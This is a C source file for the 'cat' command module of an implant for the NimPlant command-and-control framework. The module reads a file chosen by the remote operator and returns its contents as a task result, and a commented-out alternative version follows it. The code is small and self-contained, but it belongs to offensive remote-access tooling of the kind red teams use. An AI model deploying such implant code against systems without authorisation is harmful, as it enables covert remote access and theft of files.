/**
 * GNU General Public License, version 2.0.
 *
 * Copyright (c) 2025 Tijme Gommers (@tijme).
 *
 * This source code file is part of C-implant for NimPlant C2. 
 * Licensed under GNU General Public License, version 2.0, and 
 * you are free to use, modify, and distribute this file under 
 * its terms. However, any modified versions of this file must 
 * include this same license and copyright notice.
 */

/**
 * Standard Input Output.
 * 
 * Defines three variable types, several macros, and various functions for performing input and output.
 * https://www.tutorialspoint.com/c_standard_library/stdio_h.htm
 */
#include <stdio.h>

/**
 * Standard Library.
 * 
 * Defines four variable types, several macros, and various functions for performing general functions.
 * https://www.tutorialspoint.com/c_standard_library/stdlib_h.htm
 */
#include <stdlib.h>

/**
 * Booleans.
 * 
 * Defines boolean types.
 * https://pubs.opengroup.org/onlinepubs/007904975/basedefs/stdbool.h.html
 */
#include <stdbool.h>

/**
 * Run the `cat` command and save the result (based on CreateFile, GetFileSize, ReadFile & CloseHandle).
 * 
 * The `cat` command reads the file from the first argument (if exists).
 * 
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param struct NimPlantConfig* config A struct with all settings for the current beacon.
 * @param struct NimPlantClient* client A struct with runtime client settings (such as encryption key).
 * @param struct NimPlantTask* The task that has te be performed and in which the result can be saved.
 * @returns bool Positive if successfully executed.
 */
bool CommandCat(struct Relocatable* context, struct NimPlantConfig* config, struct NimPlantClient* client, struct NimPlantTask* lpTask) {
    BOOL bResultStatus = false;
    HANDLE hFile = INVALID_HANDLE_VALUE;
    DWORD dwFileSize = 0, dwBytesRead = 0;
    char* lpFileBuffer = NULL;

    // There must be exactly one argument
    if (lpTask->argumentsCount != 1) goto INVALID_ARGUMENT_AND_RETURN;

    // Open file
    hFile = context->functions.CreateFileA(lpTask->arguments[0], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) goto CANNOT_OPEN_FILE_AND_RETURN;

    // Determine file size
    dwFileSize = context->functions.GetFileSize(hFile, NULL);
    if (dwFileSize == INVALID_FILE_SIZE) goto FAILURE_AND_RETURN;

    // Allocate memory for file contents
    lpFileBuffer = context->functions.calloc(dwFileSize + 1, sizeof(char));
    if (lpFileBuffer == NULL) goto FAILURE_AND_RETURN;

    // Read file contents
    if (!context->functions.ReadFile(hFile, lpFileBuffer, dwFileSize, &dwBytesRead, NULL) || dwBytesRead != dwFileSize) goto FAILURE_AND_RETURN;
    lpFileBuffer[dwFileSize] = '\0'; // Ensure null termination

    // Close file
    context->functions.CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;

    // Store result
    lpTask->result = lpFileBuffer;
    bResultStatus = true;

    goto CLEANUP_AND_RETURN;

INVALID_ARGUMENT_AND_RETURN:
    DEFINE_STRING(lpInvalidArgument, "[invalid argument]");
    lpTask->result = context->functions.calloc(context->functions.strlen(lpInvalidArgument) + 1, sizeof(char));
    if (lpTask->result == NULL) goto FAILURE_AND_RETURN;
    context->functions.strcpy(lpTask->result, lpInvalidArgument);
    bResultStatus = true;
    goto CLEANUP_AND_RETURN;

CANNOT_OPEN_FILE_AND_RETURN:
    DEFINE_STRING(lpCannotOpenFile, "[cannot open file]");
    lpTask->result = context->functions.calloc(context->functions.strlen(lpCannotOpenFile) + 1, sizeof(char));
    if (lpTask->result == NULL) goto FAILURE_AND_RETURN;
    context->functions.strcpy(lpTask->result, lpCannotOpenFile);
    bResultStatus = true;
    goto CLEANUP_AND_RETURN;

FAILURE_AND_RETURN:
    if (hFile != INVALID_HANDLE_VALUE) context->functions.CloseHandle(hFile);
    if (lpFileBuffer != NULL) context->functions.free(lpFileBuffer);
    if (lpTask->result != NULL) context->functions.free(lpTask->result);
    goto CLEANUP_AND_RETURN;

CLEANUP_AND_RETURN:
    goto RETURN;

RETURN:
    return bResultStatus;
}

/**
 * Run the `cat` command and save the result (based on fopen, fseek, ftell, fread & fclose).
 * 
 * The `cat` command reads the file from the first argument (if exists).
 * 
 * @param struct Relocatable* context A struct with all loaded modules & functions.
 * @param struct NimPlantConfig* config A struct with all settings for the current beacon.
 * @param struct NimPlantClient* client A struct with runtime client settings (such as encryption key).
 * @param struct NimPlantTask* The task that has te be performed and in which the result can be saved.
 * @returns bool Positive if successfully executed.
 */
// bool CommandCat(struct Relocatable* context, struct NimPlantConfig* config, struct NimPlantClient* client, struct NimPlantTask* lpTask) {
//     BOOL bResultStatus = false;
//     FILE* lpFileHandle = NULL;
//     char* lpFileBuffer = NULL;
//     size_t stFileSize = 0;

//     // There must be exactly one argument
//     if (lpTask->argumentsCount != 1) goto INVALID_ARGUMENT_AND_RETURN;

//     // Open file
//     DEFINE_STRING(lpReadBinary, "rb");
//     lpFileHandle = context->functions.fopen(lpTask->arguments[0], lpReadBinary);
//     if (lpFileHandle == NULL) goto CANNOT_OPEN_FILE_AND_RETURN;

//     // Determine file size
//     context->functions.fseek(lpFileHandle, 0, SEEK_END);
//     stFileSize = context->functions.ftell(lpFileHandle);
//     context->functions.fseek(lpFileHandle, 0, SEEK_SET);

//     // Allocate memory for file contents
//     lpFileBuffer = context->functions.calloc(stFileSize + 1, sizeof(char));
//     if (lpFileBuffer == NULL) goto FAILURE_AND_RETURN;

//     // Read file contents
//     if (context->functions.fread(lpFileBuffer, 1, stFileSize, lpFileHandle) != stFileSize) goto FAILURE_AND_RETURN;
//     lpFileBuffer[stFileSize] = '\0'; // Ensure null termination

//     // Close file
//     context->functions.fclose(lpFileHandle);
//     lpFileHandle = NULL;

//     // Store result
//     lpTask->result = lpFileBuffer;
//     bResultStatus = true;

//     goto CLEANUP_AND_RETURN;

// INVALID_ARGUMENT_AND_RETURN:
//     DEFINE_STRING(lpInvalidArgument, "[invalid argument]");
//     lpTask->result = context->functions.calloc(context->functions.strlen(lpInvalidArgument) + 1, sizeof(char));
//     if (lpTask->result == NULL) goto FAILURE_AND_RETURN;
//     context->functions.strcpy(lpTask->result, lpInvalidArgument);
//     bResultStatus = true;
//     goto CLEANUP_AND_RETURN;

// CANNOT_OPEN_FILE_AND_RETURN:
//     DEFINE_STRING(lpCannotOpenFile, "[cannot open file]");
//     lpTask->result = context->functions.calloc(context->functions.strlen(lpCannotOpenFile) + 1, sizeof(char));
//     if (lpTask->result == NULL) goto FAILURE_AND_RETURN;
//     context->functions.strcpy(lpTask->result, lpCannotOpenFile);
//     bResultStatus = true;
//     goto CLEANUP_AND_RETURN;

// FAILURE_AND_RETURN:
//     if (lpFileHandle != NULL) context->functions.fclose(lpFileHandle);
//     if (lpFileBuffer != NULL) context->functions.free(lpFileBuffer);
//     if (lpTask->result != NULL) context->functions.free(lpTask->result);
//     goto CLEANUP_AND_RETURN;

// CLEANUP_AND_RETURN:
//     goto RETURN;

// RETURN:
//     return bResultStatus;
// }